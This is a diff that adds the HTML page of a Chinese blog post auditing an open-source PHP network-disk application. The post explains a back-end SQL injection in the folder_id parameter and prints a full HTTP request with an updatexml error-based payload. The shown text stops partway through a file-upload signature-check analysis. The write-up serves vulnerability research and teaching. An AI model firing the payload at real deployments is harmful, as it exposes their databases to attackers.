@@ -1,0 +1,894 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/head.jpg">
+  <link rel="icon" href="/img/head.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Zjacky">
+  <meta name="keywords" content="Zjacky">
+  
+    <meta name="description" content="‍ 前言‍ 代码审计篇章都是自己跟几个师傅们一起审计的1day或者0day(当然都是小公司较为简单)，禁止未经允许进行转载，发布到博客的用意主要是想跟师傅们能够交流下审计的思路，毕竟审计的思路也是有说法的，或者是相互源码共享也OK，本次审计的目标是某开源网盘的审计，大部分是一些带颜色的网站和奇怪的东东使用，有师傅分析过了但没详细审计思路于是有了这篇博客来交流交流 ‍ 审计‍ 路由分析‍ 首先这里明">
+<meta property="og:type" content="article">
+<meta property="og:title" content="代码审计 - PHP - 某网盘1day分析">
+<meta property="og:url" content="https://zjackky.github.io/post/code-audit-php-network-disk-1day-analysis-duplicated-20240108-19-32-53-1i9ljt.html">
+<meta property="og:site_name" content="Zjacky Blog">
+<meta property="og:description" content="‍ 前言‍ 代码审计篇章都是自己跟几个师傅们一起审计的1day或者0day(当然都是小公司较为简单)，禁止未经允许进行转载，发布到博客的用意主要是想跟师傅们能够交流下审计的思路，毕竟审计的思路也是有说法的，或者是相互源码共享也OK，本次审计的目标是某开源网盘的审计，大部分是一些带颜色的网站和奇怪的东东使用，有师傅分析过了但没详细审计思路于是有了这篇博客来交流交流 ‍ 审计‍ 路由分析‍ 首先这里明">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933760.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933197.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933501.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933732.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933842.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933965.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933133.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933596.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933808.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933932.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933059.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933183.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933324.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933451.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933844.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933145.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933288.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933413.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933776.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933910.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933062.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933596.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933720.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933877.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933003.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933113.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933321.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933570.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933744.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933889.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933013.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933171.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933287.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933438.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933559.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081930201.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401070009584.png">
+<meta property="article:published_time" content="2024-01-06T10:10:57.000Z">
+<meta property="article:modified_time" content="2024-01-06T16:09:20.000Z">
+<meta property="article:author" content="Zjacky">
+<meta property="article:tag" content="Zjacky">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933760.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>代码审计 - PHP - 某网盘1day分析 - Zjacky Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"zjackky.github.io","root":"/","version":"1.9.6","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"❡"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"left","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":"all"},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"ettOSzlYFG4lS9fISQ6HkhSB-gzGzoHsz","app_key":"8KhEO1ZJ8VClKZ1IGQdU1yCK","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Zjacky&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/3.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="代码审计 - PHP - 某网盘1day分析"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-01-06 18:10" pubdate>
+          2024年1月6日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          1.7k 字
+        
+      </span>
+    
+
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span>次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="padding-left: 2rem; margin-right: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">代码审计 - PHP - 某网盘1day分析</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2024年1月7日 凌晨
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>‍</p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>‍</p>
+<p>代码审计篇章都是自己跟几个师傅们一起审计的1day或者0day(当然都是小公司较为简单)，禁止未经允许进行转载，发布到博客的用意主要是想跟师傅们能够交流下审计的思路，毕竟审计的思路也是有说法的，或者是相互源码共享也OK，本次审计的目标是某开源网盘的审计，大部分是一些带颜色的网站和奇怪的东东使用，有师傅分析过了但没详细审计思路于是有了这篇博客来交流交流</p>
+<p>‍</p>
+<h1 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h1><p>‍</p>
+<h2 id="路由分析"><a href="#路由分析" class="headerlink" title="路由分析"></a>路由分析</h2><p>‍</p>
+<p>首先这里明眼人一看就知道在<code>application</code>​这个目录下，可以抓登录的接口或者注册的接口或者进去后的接口来判断对应的代码之后登录进去寻找文件</p>
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933760.png" srcset="/img/loading.gif" lazyload alt="image">​​</p>
+<p>‍</p>
+<p>‍​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933197.png" srcset="/img/loading.gif" lazyload alt="image">​​</p>
+<p>路由很少，所以很明显看出我们登录的<code>/user/login/</code>​对应的是<code>index</code>​目录下的<code>User.php</code>​的<code>login</code>​方法</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933501.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>‍</p>
+<h2 id="后台SQL注入"><a href="#后台SQL注入" class="headerlink" title="后台SQL注入"></a>后台SQL注入</h2><p>emm本来想看前台的，但是大部分是存在鉴权代码的</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933732.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p><code>$this-&gt;userInfo[&#39;id&#39;]</code>​</p>
+<p>由于是TP的框架，所以先来回顾下TP的<code>where</code>​语句</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933842.png" srcset="/img/loading.gif" lazyload alt="7a43a6589314728fd86a0126f8c3288">​</p>
+<p>在TP框架中，大部分的SQL查询都是做了参数绑定的，如下图所示</p>
+<p>‍</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933965.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>这里的<code>$code</code>​就是做了参数绑定，但是一开始去试着访问的时候发现是 <code>404</code>​ 并且返回非法请求</p>
+<p>然后参考了下这篇文章 发现原来可能存在路由定义的问题</p>
+<p><a target="_blank" rel="noopener" href="https://www.kancloud.cn/z8859346/thinkphp/1747811">https://www.kancloud.cn/z8859346/thinkphp/1747811</a></p>
+<p>找到<code>/route/route.php</code>​</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933133.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>发现对<code>index</code>​这个模块进行了定义，所以要根据他的规则来进行访问，只要访问了<code>/s:code</code>​就会去访问<code>index/share</code>​方法</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933596.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>但因为<code>:code</code>​进行了占位符 所以相当于绑定了参数无法进行注入</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933808.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>所以这些点都不存在SQL注入</p>
+<p>‍</p>
+<p>‍</p>
+<p>于是转向了后台</p>
+<p>‍</p>
+<p>跟踪到index的file文件，发现了<code>list()</code>​方法这里接受几个可控的 参数<code>foloder.id</code>​、<code>search</code>​，进入到<code>FileManager#listFile()</code>​方法中</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933932.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>主要是因为<code>listfile()</code>​这个命名还是很大可能会跟数据库有关联的，所以跟进下</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933059.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>这<code>listFile</code>​这个方法里面，他会先执行<code>self</code>​类里面的<code>getfolderPid</code>​这个方法,并且传入<code>$folder_id</code>​</p>
+<p>再次跟进</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933183.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>我们传入的内容不为空，所以传了啥返回啥，接下来往下走就是整个SQL的一个坑点了</p>
+<p>‍</p>
+<h3 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h3><p>‍</p>
+<p>接着就是数组的形式进行赋值</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933324.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>那么现在问题来了，他是以数组的形式去进行sql查询，那么可能存在sql的点吗？我们来进行mysql的监控</p>
+<p>‍</p>
+<p>代码如下，先是单数组正常使用<code>select</code>​查询</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$ttt</span> = <span class="hljs-title function_ invoke__">db</span>(<span class="hljs-string">&#x27;stores&#x27;</span>)<br>    -&gt;<span class="hljs-title function_ invoke__">where</span>([<span class="hljs-string">&#x27;parent_folder&#x27;</span>=&gt;<span class="hljs-variable">$folder_id</span>])<br>    -&gt;<span class="hljs-title function_ invoke__">where</span>(<span class="hljs-string">&#x27;origin_name&#x27;</span>,<span class="hljs-string">&#x27;like&#x27;</span>,<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$search</span>.<span class="hljs-string">&#x27;%&#x27;</span>)<br>    -&gt;<span class="hljs-title function_ invoke__">field</span>(<span class="hljs-string">&#x27;id,uid,shares_id,origin_name as name,ext,size,count_down,count_open,update_time&#x27;</span>)<br>    -&gt;<span class="hljs-title function_ invoke__">select</span>();<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$ttt</span>);<br><span class="hljs-keyword">die</span>();<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933451.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>发现正常转义了，那么双数组跟三数组也是一样到效果，那么这里就得到一个结论，并不是因为数组的拼接问题所导致的sql注入，那么细心的话可以发现，我的代码其实跟原始代码是有一定的区别的，就是并没有加入一个关键代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">-&gt;<span class="hljs-title function_ invoke__">fetchSql</span>(<span class="hljs-literal">true</span>)<br></code></pre></td></tr></table></figure>
+
+<p>这里来解释一下<code>fetchSql</code>​ 方法</p>
+<p>‍</p>
+<blockquote>
+<p><span style="font-weight: bold;" data-type="strong">fetchSql</span> 方法在 ThinkPHP 框架中（以及其他可能支持该功能的框架或数据库操作类）的主要作用是获取即将执行的 SQL 查询语句，而不是真正执行这个查询。当你调用 <span style="font-weight: bold;" data-type="strong">fetchSql(true)</span>  时，框架会生成对应的 SQL 语句并返回，但并不会执行该 SQL</p>
+</blockquote>
+<p>‍</p>
+<p>啥意思呢，来看数据库监控</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933844.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>可以发现数据库监控仅仅只是输出了一条 展示字段的SQL语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SHOW</span> COLUMNS <span class="hljs-keyword">FROM</span> `sk_stores`<br></code></pre></td></tr></table></figure>
+
+<p>那其实就是因为他压根就没有进行查询我们的<code>where</code>​条件 —&gt; 这其实就也印证了我之前一直说 并没有在数据库监控中看到这些查询语句，是因为使用了<code>fetchSql(true)</code>​</p>
+<p>‍</p>
+<p>那么接下来既然是没有进行SQL语句的执行的，那么也就是我们现在的<code>$files_sql</code>​是一条尚未执行的SQL语句，我们来打印一下看看</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">string</span>(<span class="hljs-number">221</span>) <span class="hljs-string">&quot;SELECT `id`,`uid`,`shares_id`,origin_name as name,`ext`,`size`,`count_down`,`count_open`,`update_time` FROM `sk_stores` WHERE  `uid` = 10  AND `parent_folder` = 3&#x27;  AND `delete_time` IS NULL  AND `origin_name` LIKE &#x27;%aa%&#x27;&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933145.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>正是因为没有带入数据库查询，所以里面的特殊符号比如<code>&#39;</code>​就并没有参数绑定或者预编译或者转义，而最终产生SQL注入的万恶之源，正是下方的<code>union</code>​</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933288.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933413.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> `id`,`uid`,`shares_id`,folder_name <span class="hljs-keyword">as</span> name,`ext`,`size`,`count_down`,`count_open`,`update_time` <span class="hljs-keyword">FROM</span> `sk_folders` <span class="hljs-keyword">WHERE</span>  `uid` <span class="hljs-operator">=</span> <span class="hljs-number">10</span>  <span class="hljs-keyword">AND</span> `parent_folder` <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;3&#x27;</span>  <span class="hljs-keyword">AND</span> `delete_time` <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NULL</span>  <span class="hljs-keyword">AND</span> `folder_name` <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;%aa%&#x27;</span> <br><br><span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span> <br><br>( <span class="hljs-keyword">SELECT</span> `id`,`uid`,`shares_id`,origin_name <span class="hljs-keyword">as</span> name,`ext`,`size`,`count_down`,`count_open`,`update_time` <span class="hljs-keyword">FROM</span> `sk_stores` <span class="hljs-keyword">WHERE</span>  `uid` <span class="hljs-operator">=</span> <span class="hljs-number">10</span>  <span class="hljs-keyword">AND</span> `parent_folder` <span class="hljs-operator">=</span> <span class="hljs-number">3</span>  <span class="hljs-keyword">AND</span> `delete_time` <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NULL</span>  <span class="hljs-keyword">AND</span> `origin_name` <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;%aa%&#x27;</span> ) LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">20</span><br></code></pre></td></tr></table></figure>
+
+<p>所以最终的结果就是因为通过了<code>union</code>​去拼接起来了，所以才导致了SQL注入的产生，破案了</p>
+<p>‍</p>
+<p>最终报文如下</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml">GET /file/list?folder_id=1-updatexml(1,concat(0x7e,database(),0x7e),1)&amp;search=&amp;page=&amp;rows= HTTP/1.1<br>Host: wp.com<br>Accept: application/json, text/javascript, */*; q=0.01<br>X-Requested-With: XMLHttpRequest<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36<br>Content-Type: application/json<br>Referer: http://wp.com/user/index<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Cookie: PHPSESSID=21cpn2h5jqf7e47k8dtlrhnmk4<br>Connection: close<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933776.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>‍</p>
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>‍</p>
+<p>首先全局搜索<code>move_uploaded_file</code>​函数，发现<code>public/server/index.php</code>​文件引用该函数</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933910.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>之后便发现这个方法是一个<code>protected</code>​权限来修饰，所以这个方法直接调用不成功</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933062.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>之后就要去观看这个文件被谁来调用 发现是<code>\public\server\index.php#start()</code>​调用了，刚好是符合<code>protected</code>​属性的</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933596.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>但是往上看发现存在验签操作</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933720.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>发现是存在两个传参，<code>$command</code>​ <code>$sign</code>​ 并且是需要验签的，那我们跟进<code>sign_verify</code>​看看</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933877.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>继续跟进​<code>sign_params</code>​</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933003.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>如果不理解我们可以写个demo本地测试下</p>
+<p>首先流程如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">我们传入的HTTP参数 这个数组的<span class="hljs-built_in">hash</span>  == 我们sign传入的<span class="hljs-built_in">hash</span> <br></code></pre></td></tr></table></figure>
+
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933113.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>他会把我们传入的<code>$sign</code>​不作为<code>$params</code>​去传参</p>
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933321.png" srcset="/img/loading.gif" lazyload alt="image">​​</p>
+<p>那么逻辑就清楚了就是我们<code>GET</code>​传参的内容跟我们<code>token</code>​传入的内容进行拼接且MD5的值跟我们<code>$sign</code>​要相同</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933570.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>如果验签成功，就能够进入到<code>upload</code>​的逻辑中</p>
+<p>之后就调用<code>upload_file</code>​这个函数，这个函数我也说了，他是调用<code>move_uplaoded_file</code>​函数进行上传的，他接受一个参数<code>uid</code>​的值</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933744.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
